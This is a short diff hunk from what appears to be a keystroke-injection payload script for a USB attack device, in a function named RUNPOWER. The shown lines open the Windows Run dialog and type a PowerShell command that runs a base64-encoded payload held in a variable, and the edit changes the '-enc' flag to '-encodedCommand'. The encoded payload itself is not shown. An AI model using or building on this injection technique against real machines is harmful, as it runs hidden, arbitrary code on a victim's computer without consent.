@@ -23,7 +23,7 @@ function RUNPOWER() {
 		 QUACK DELAY 1000 		
          QUACK GUI r
          QUACK DELAY 500
-         QUACK STRING "Powershell.exe　-enc $encodecmd"
+         QUACK STRING "Powershell.exe　-encodedCommand $encodecmd"
          QUACK ENTER
          ;;
 
